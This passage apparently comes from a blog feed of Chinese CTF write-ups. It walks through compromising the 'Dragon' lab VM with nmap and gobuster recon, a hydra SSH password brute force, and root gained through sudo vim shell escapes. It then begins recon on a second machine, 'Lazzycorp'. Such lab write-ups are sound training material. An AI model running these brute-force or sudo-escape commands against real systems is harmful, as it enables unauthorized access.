seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.67</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.67                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 10:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:93:AF:C2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.43 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.67 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 10:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.0011s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 3e:98:c6:f1:55:e6:30:8b:83:c4:69:60:d9:ed:11:4d (ECDSA)<br>|_  256 b5:d2:46:75:32:b0:98:b2:8f:61:02:95:cf:ba:19:c6 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))<br>|_http-title: La M\xC3\xA1quina del Drag\xC3\xB3n<br>|_http-server-header: Apache/2.4.58 (Ubuntu)<br>MAC Address: 08:00:27:93:AF:C2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.95 seconds<br></code></pre></td></tr></table></figure><ol><li><strong>22端口：ssh服务</strong>，版本为<code>OpenSSH 9.6p1</code></li><li><strong>80端口：http服务</strong>，版本为<code>Apache httpd 2.4.58</code></li></ol><h3 id="3-udp端口扫描"><a href="#3-udp端口扫描" class="headerlink" title="3.udp端口扫描"></a>3.udp端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sU --top-ports 100 192.168.2.67<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 11:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.00089s latency).<br>All 100 scanned ports on 192.168.2.67 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 56 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:93:AF:C2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 54.03 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h3 id="4-漏洞脚本扫描"><a href="#4-漏洞脚本扫描" class="headerlink" title="4.漏洞脚本扫描"></a>4.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p22,80 192.168.2.67                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 10:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.67<br>Host is up (0.00080s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /secret/: Potentially interesting folder</span><br><span class="hljs-string">MAC Address: 08:00:27:93:AF:C2 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.45 seconds</span><br></code></pre></td></tr></table></figure><p>发现<code>80</code>下面存在一个目录<code>/secret</code></p><h2 id="3、WEB目录扫描"><a href="#3、WEB目录扫描" class="headerlink" title="3、WEB目录扫描"></a>3、WEB目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.67 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.67<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,md,db,js,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 981]<br>/secret               (Status: 301) [Size: 313] [--&gt; http://192.168.2.67/secret/]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1764480 / 1764488 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>也是存在目录<code>/secret</code></p><h1 id="二、漏洞测试"><a href="#二、漏洞测试" class="headerlink" title="二、漏洞测试"></a>二、漏洞测试</h1><h2 id="1、WEB-80端口渗透"><a href="#1、WEB-80端口渗透" class="headerlink" title="1、WEB-80端口渗透"></a>1、WEB-80端口渗透</h2><p>访问80端口，没有啥有用的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508201132362.png"></p><p>访问<code>/secret</code>，根据相关的提示，猜测<code>dragon</code>是<code>ssh服务</code>登录的用户名<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508201133507.png"></p><h2 id="2、SSH口令猜测"><a href="#2、SSH口令猜测" class="headerlink" title="2、SSH口令猜测"></a>2、SSH口令猜测</h2><p>使用<code>hydra</code>进行口令猜测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# hydra -t 64 -l dragon -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.67 -F -I<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-20 11:16:49<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task<br>[DATA] attacking ssh://192.168.2.67:22/<br>[22][ssh] host: 192.168.2.67   login: dragon   password: shadow<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.67 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-20 11:16:58<br></code></pre></td></tr></table></figure><p>找到SSH服务登录凭证，<code>login: dragon   password: shadow</code></p><h2 id="3、获取dragon权限"><a href="#3、获取dragon权限" class="headerlink" title="3、获取dragon权限"></a>3、获取dragon权限</h2><p>使用获取到的凭证直接进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh dragon@192.168.2.67<br>dragon@192.168.2.67<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-71-generic x86_64)</span><br><span class="hljs-string">Last login: Tue Aug  5 08:13:55 2025 from 192.168.18.16</span><br><span class="hljs-string">dragon@TheHackersLabs-Dragon:~$ id</span><br><span class="hljs-string">uid=1000(dragon) gid=1000(dragon) groups=1000(dragon),24(cdrom),30(dip),46(plugdev),101(lxd)</span><br></code></pre></td></tr></table></figure><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h2><p>查看当前用户在<code>/etc/sudoers</code>配置文件中的权限，即当前用户被允许以<code>sudo权限</code>执行的命令有哪些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">dragon@TheHackersLabs-Dragon:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> dragon on TheHackersLabs-Dragon:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User dragon may run the following commands on TheHackersLabs-Dragon:<br>    (ALL) NOPASSWD: /usr/bin/vim<br></code></pre></td></tr></table></figure><h3 id="sudo-vim提权"><a href="#sudo-vim提权" class="headerlink" title="sudo-vim提权"></a>sudo-vim提权</h3><p>发现<code>/usr/bin/vim</code>具有<code>sudo</code>权限<br>    直接使用下面的命令进行利用即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br><span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;:py import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span><br><span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;:lua os.execute(&quot;reset; exec sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dragon@TheHackersLabs-Dragon:~$ <span class="hljs-built_in">sudo</span> /usr/bin/vim -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span><br><span class="hljs-comment"># id  </span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="四、获取FLAG"><a href="#四、获取FLAG" class="headerlink" title="四、获取FLAG"></a>四、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /home/dragon/user.txt /root/root.txt</span><br>e1f9c2e8a1d8477f9b3f6cd298f9f3bd<br>7a4d1b35eebf4aefa5f1b0198b0d6c17<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Thehackerslabs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssh口令猜测</tag>
      
      <tag>sudo-vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lazzycorp</title>
    <link href="/Hackmyvm/Lazzycorp/"/>
    <url>/Hackmyvm/Lazzycorp/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://hackmyvm.eu/machines/machine.php?vm=Lazzycorp">https://hackmyvm.eu/machines/machine.php?vm=Lazzycorp</a></li><li>WP编写参考：<a href="https://7r1umphk.github.io/post/hmv_Lazzycorp.html">https://7r1umphk.github.io/post/hmv_Lazzycorp.html</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 16:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00045s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00034s latency).<br>MAC Address: 08:00:27:70:FA:0F (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.66<br>Host is up (0.00078s latency).<br>MAC Address: 08:00:27:CB:D0:41 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.09 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.66</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># nmap --min-rate 10000 -p- 192.168.2.66                   </span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">16</span>:<span class="hljs-number">45</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.66</span><br>Host is up (<span class="hljs-number">0.0013</span>s latency).<br>Not shown: <span class="hljs-number">65532</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span><br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:CB:D0:<span class="hljs-number">41</span> (Oracle VirtualBox virtual NIC)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">31.24</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><p>开放端口：<code>21,22,80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs coq">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate <span class="hljs-number">10000</span> -sT -sV -sC -O -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span> <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.66</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">16</span>:<span class="hljs-number">46</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.66</span><br>Host is up (<span class="hljs-number">0.0011</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3.0</span><span class="hljs-number">.5</span><br>| <span class="hljs-type">ftp</span>-syst: <br>|   <span class="hljs-type">STAT</span>: <br>| <span class="hljs-type">FTP</span> server status:<br>|      <span class="hljs-type">Connected</span> to ::ffff:<span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span><br>|      <span class="hljs-type">Logged</span> <span class="hljs-built_in">in</span> <span class="hljs-built_in">as</span> ftp<br>|      <span class="hljs-type">TYPE</span>: ASCII<br>|      <span class="hljs-type">No</span> session bandwidth limit<br>|      <span class="hljs-type">Session</span> <span class="hljs-built_in">timeout</span> <span class="hljs-built_in">in</span> seconds is <span class="hljs-number">300</span><br>|      <span class="hljs-type">Control</span> connection is plain text<br>|      <span class="hljs-type">Data</span> connections will be plain text<br>|      <span class="hljs-type">At</span> session startup, client count was <span class="hljs-number">4</span><br>|      <span class="hljs-type">vsFTPd</span> <span class="hljs-number">3.0</span><span class="hljs-number">.5</span> - secure, fast, stable<br>|<span class="hljs-type">_End</span> of status<br>| <span class="hljs-type">ftp</span>-anon: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br>|<span class="hljs-type">_drwxr</span>-xr-x    <span class="hljs-number">2</span> <span class="hljs-number">114</span>      <span class="hljs-number">119</span>          <span class="hljs-number">4096</span> Jul <span class="hljs-number">16</span> <span class="hljs-number">12</span>:<span class="hljs-number">35</span> pub<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.13</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">3072</span> <span class="hljs-number">46</span>:<span class="hljs-number">82</span>:<span class="hljs-number">43</span>:<span class="hljs-number">4</span>b:ef:e0:b0:<span class="hljs-number">50</span>:<span class="hljs-number">04</span>:c0:d5:<span class="hljs-number">2</span>c:<span class="hljs-number">3</span>c:<span class="hljs-number">5</span>c:<span class="hljs-number">7</span>d:<span class="hljs-number">4</span>a (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">52</span>:<span class="hljs-number">79</span>:ea:<span class="hljs-number">92</span>:<span class="hljs-number">35</span>:b4:f2:<span class="hljs-number">5</span>d:b9:<span class="hljs-number">14</span>:f0:<span class="hljs-number">21</span>:<span class="hljs-number">1</span>c:eb:<span class="hljs-number">2</span>f:<span class="hljs-number">66</span> (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">98</span>:fa:<span class="hljs-number">95</span>:<span class="hljs-number">86</span>:<span class="hljs-number">04</span>:<span class="hljs-number">75</span>:<span class="hljs-number">31</span>:<span class="hljs-number">39</span>:c6:<span class="hljs-number">60</span>:<span class="hljs-number">26</span>:<span class="hljs-number">9</span>e:<span class="hljs-number">26</span>:<span class="hljs-number">86</span>:<span class="hljs-number">82</span>:<span class="hljs-number">88</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))<br>|<span class="hljs-type">_http</span>-title: LazyCorp | <span class="hljs-type">Empowering</span> Devs<br>| <span class="hljs-type">http</span>-robots.txt: <span class="hljs-number">2</span> disallowed entries <br>|<span class="hljs-type">_</span>/cms-admin.php /auth-LazyCorp-dev/<br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:CB:D0:<span class="hljs-number">41</span> (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find <span class="hljs-built_in">at</span> least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Device type: general purpose<br>Running: Linux <span class="hljs-number">4.</span>X|<span class="hljs-type">5</span>.X<br>OS CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">5</span><br>OS details: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.8</span><br>Network Distance: <span class="hljs-number">1</span> hop<br>Service <span class="hljs-keyword">Info</span>: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-built_in">in</span> <span class="hljs-number">9.24</span> seconds<br></code></pre></td></tr></table></figure><ol><li><strong>21端口：ftp服务</strong>，版本为<code>vsftpd 3.0.5</code>，发现允许使用<code>anonymous</code>作为用户名和密码进行登录，同时存在一个<code>pub</code>为文件</li><li><strong>22端口：ssh服务</strong>，版本为<code>OpenSSH 8.2p1</code></li><li><strong>80端口：http服务</strong>，版本为<code>Apache httpd 2.4.41</code>，同时存在<code>robots.txt</code>文件，里面有两个路径：<code>/cms-admin.php、/auth-LazyCorp-dev/</code></li></ol><h3 id="3-udp端口扫描"><a href="#3-udp端口扫描" class="headerlink" title="3.udp端口扫描"></a>3.udp端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sU --top-ports 100 192.168.2.66 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 23:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.66<br>Host is up (0.0014s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:63:D7:A1 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 106.07 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h3 id="4-漏洞脚本扫描"><a href="#4-漏洞脚本扫描" class="headerlink" title="4.漏洞脚本扫描"></a>4.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p21,22,80 192.168.2.66                  <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 23:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.66<br>Host is up (0.0011s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /robots.txt: Robots file</span><br><span class="hljs-string">MAC Address: 08:00:27:63:D7:A1 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds</span><br></code></pre></td></tr></table></figure><p>没有新的价值信息</p><h2 id="3、web目录扫描"><a href="#3、web目录扫描" class="headerlink" title="3、web目录扫描"></a>3、web目录扫描</h2><figure class="highlight 